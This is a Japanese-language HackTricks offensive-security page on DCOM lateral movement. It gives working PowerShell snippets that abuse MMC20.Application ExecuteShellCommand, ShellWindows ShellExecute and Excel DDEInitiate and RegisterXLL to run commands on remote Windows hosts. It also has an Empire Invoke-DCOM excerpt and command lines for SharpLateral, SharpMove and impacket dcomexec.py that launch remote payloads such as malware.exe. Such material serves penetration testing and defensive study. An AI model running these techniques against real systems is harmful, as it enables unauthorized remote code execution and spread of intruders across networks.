# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**この技術に関する詳細は、[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)の元の投稿を確認してください。**

Distributed Component Object Model (DCOM) オブジェクトは、オブジェクトとのネットワークベースの相互作用に対して興味深い機能を提供します。Microsoftは、DCOMおよびComponent Object Model (COM)に関する包括的なドキュメントを提供しており、[こちらでDCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx)と[こちらでCOM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)にアクセスできます。DCOMアプリケーションのリストは、PowerShellコマンドを使用して取得できます:
```bash
Get-CimInstance Win32_DCOMApplication
```
COMオブジェクト、[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)は、MMCスナップイン操作のスクリプトを可能にします。特に、このオブジェクトには`Document.ActiveView`の下に`ExecuteShellCommand`メソッドが含まれています。このメソッドに関する詳細情報は[こちら](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)で確認できます。実行してみてください：

この機能は、DCOMアプリケーションを介してネットワーク上でコマンドを実行することを容易にします。管理者としてDCOMにリモートで対話するために、PowerShellを次のように利用できます：
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
このコマンドはDCOMアプリケーションに接続し、COMオブジェクトのインスタンスを返します。次にExecuteShellCommandメソッドを呼び出して、リモートホスト上でプロセスを実行できます。このプロセスは以下のステップを含みます：

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCEを取得する:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**この技術に関する詳細は、元の投稿を確認してください [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** オブジェクトは、明示的な "LaunchPermissions" が欠如しており、デフォルトで管理者のアクセスを許可する権限に設定されています。詳細については、スレッドを [こちら](https://twitter.com/tiraniddo/status/817532039771525120) で確認でき、明示的な Launch Permission を持たないオブジェクトをフィルタリングするために [@tiraniddo](https://twitter.com/tiraniddo) の OleView .NET の使用が推奨されます。

特に、`ShellBrowserWindow` と `ShellWindows` の2つのオブジェクトは、明示的な Launch Permissions が欠如しているために強調されました。`HKCR:\AppID\{guid}` の下に `LaunchPermission` レジストリエントリが存在しないことは、明示的な権限がないことを示しています。

### ShellWindows

ProgID が欠如している `ShellWindows` に対して、.NET メソッド `Type.GetTypeFromCLSID` と `Activator.CreateInstance` を使用して、その AppID を用いてオブジェクトのインスタンス化を行います。このプロセスは OleView .NET を利用して `ShellWindows` の CLSID を取得します。インスタンス化された後は、`WindowsShell.Item` メソッドを通じて相互作用が可能で、`Document.Application.ShellExecute` のようなメソッド呼び出しが行えます。

オブジェクトをインスタンス化し、リモートでコマンドを実行するための PowerShell コマンドの例が提供されました:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)

# Need to upload the file to execute
$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
```
### Lateral Movement with Excel DCOM Objects

ラテラルムーブメントは、DCOM Excelオブジェクトを悪用することで達成できます。詳細情報については、[Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)でのExcel DDEを利用したDCOM経由のラテラルムーブメントに関する議論を読むことをお勧めします。

Empireプロジェクトは、DCOMオブジェクトを操作することによってExcelを使用したリモートコード実行（RCE）を示すPowerShellスクリプトを提供しています。以下は、[Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)で入手可能なスクリプトからのスニペットで、RCEのためにExcelを悪用するさまざまな方法を示しています：
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Lateral Movementのための自動化ツール

これらの技術を自動化するために2つのツールが強調されています：

- **Invoke-DCOM.ps1**: リモートマシンでコードを実行するための異なるメソッドの呼び出しを簡素化するEmpireプロジェクトによって提供されるPowerShellスクリプト。このスクリプトはEmpireのGitHubリポジトリで入手可能です。

- **SharpLateral**: リモートでコードを実行するために設計されたツールで、次のコマンドで使用できます：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 自動ツール

- Powershellスクリプト [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) は、他のマシンでコードを実行するためのすべてのコメントされた方法を簡単に呼び出すことができます。
- Impacketの `dcomexec.py` を使用して、DCOMを利用してリモートシステムでコマンドを実行できます。
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
```
- あなたは[**SharpLateral**](https://github.com/mertdas/SharpLateral)を使用することもできます:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- あなたはまた[**SharpMove**](https://github.com/0xthirteen/SharpMove)を使用することもできます。
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 参考文献

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
